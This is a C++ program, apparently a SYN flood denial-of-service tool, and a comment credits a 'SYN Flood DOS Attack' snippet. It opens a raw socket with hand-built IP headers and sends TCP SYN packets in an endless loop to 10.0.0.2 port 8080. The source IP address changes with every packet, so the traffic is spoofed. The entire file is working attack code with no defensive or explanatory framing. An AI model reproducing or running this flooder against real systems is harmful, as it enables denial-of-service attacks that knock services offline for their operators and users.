#include <iostream>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <cstring>

#define __DEBUG__ false

// https://github.com/seifzadeh/c-network-programming-best-snipts/blob/master/SYN%20Flood%20DOS%20Attack%20with%20C%20Source%20Code%20(Linux)
// "Bogus TCP length" problem is fixed thanks to implementation at above link

void debug_print(const std::string & msg) {
    if (true == __DEBUG__) {
        std::cerr << msg << std::endl;
    }
}

// https://locklessinc.com/articles/tcp_checksum/
unsigned short checksum(const char *buf, unsigned size)
{
    unsigned sum = 0;
    unsigned i;

    /* Accumulate checksum */
    for (i = 0; i < size - 1; i += 2)
    {
        unsigned short word16 = *(unsigned short *) &buf[i];
        sum += word16;
    }

    /* Handle odd-sized case */
    if (size & 1)
    {
        unsigned short word16 = (unsigned char) buf[i];
        sum += word16;
    }

    /* Fold to get the ones-complement result */
    while (sum >> 16) sum = (sum & 0xFFFF)+(sum >> 16);

    /* Invert to get the negative in ones-complement arithmetic */
    return static_cast<unsigned short>(~sum);
}

typedef struct iphdr IP_HEADER;
typedef struct tcphdr TCP_HEADER;

// http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
typedef struct PSEUDO_HEADER {
    // pseudo header
    unsigned source_addr;
    unsigned dest_addr;
    unsigned char reserved;
    unsigned char protocol;
    unsigned short tcp_length;
    // tcp header
    TCP_HEADER tcp_header;

} PSEUDO_HEADER;

int main() {

    unsigned IP_HEADER_SIZE = sizeof(IP_HEADER);
    unsigned TCP_HEADER_SIZE = sizeof(TCP_HEADER);
    unsigned DATAGRAM_SIZE = IP_HEADER_SIZE + TCP_HEADER_SIZE;

    // TCP/IP datagram
    // IP Header + Layer 3 (Transport Layer) Data
    char datagram[DATAGRAM_SIZE];
    memset(datagram, 0, DATAGRAM_SIZE);

    // IP header
    auto *ip_header = reinterpret_cast<IP_HEADER *>(datagram);

    ip_header->version = 4; // IPv4
    ip_header->ihl = 5; // (5 words * 4 = 20 bytes excluding options etc)
    ip_header->tot_len = static_cast<u_int16_t>(DATAGRAM_SIZE);
    ip_header->ttl = 0xFF; // set to max
    ip_header->protocol = 6; // TCP
    ip_header->daddr = inet_addr("10.0.0.2");

    // TCP header
    auto *tcp_header = reinterpret_cast<TCP_HEADER *>(datagram + IP_HEADER_SIZE);

    tcp_header->dest = htons(8080);
    tcp_header->source = htons(8080);
    tcp_header->doff = 5;
    tcp_header->syn = 1;
    tcp_header->window = htons(5840); //set to maximum

    // prepare pseudo header for tcp checksum, by rfc
    PSEUDO_HEADER pseudo_header{};

    pseudo_header.dest_addr = inet_addr("10.0.0.2");
    pseudo_header.protocol = 6;
    pseudo_header.tcp_length = htons(TCP_HEADER_SIZE);

    const int OPTION_SET = 1;
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    // set Network Layer options for it to take datagrams directly
    // IP_HDRINCL - > header is included !
    if (1 == setsockopt (s, IPPROTO_IP, IP_HDRINCL, &OPTION_SET, sizeof(int))) {
        std::cerr << "Cannot set IP level socket option." << std::endl;
        exit(1);
    }

    struct sockaddr_in dest_address{};
    dest_address.sin_family = AF_INET;
    dest_address.sin_port = htons(8080);
    dest_address.sin_addr.s_addr = inet_addr("10.0.0.2");

    for (;;) {

        ip_header->check = 0;

        ip_header->id = static_cast<u_int16_t>((ip_header->id + 1) % (0xFFFF));
        ip_header->saddr = (ip_header->saddr + 1) % (0xFFFFFFFF);
        ip_header->check = checksum((const char*)ip_header, IP_HEADER_SIZE);

        tcp_header->check = 0;

        pseudo_header.source_addr = (pseudo_header.source_addr + 1) % (0xFFFFFFFF);

        memcpy(&pseudo_header.tcp_header, tcp_header, TCP_HEADER_SIZE);

        // Ready for tcp checksum

        tcp_header->check = checksum((const char*) &pseudo_header, sizeof(PSEUDO_HEADER));

        //Send the packet
        ssize_t bytes_sent = sendto(s, datagram, ip_header->tot_len, 0, (struct sockaddr *) &dest_address, sizeof(dest_address));

        if (bytes_sent < 0) {
            debug_print("sendto could not send any bytes!");
        }
        else {
            debug_print("Sent " + std::to_string(bytes_sent) + " bytes.");
        }
    }

    return 0;
}
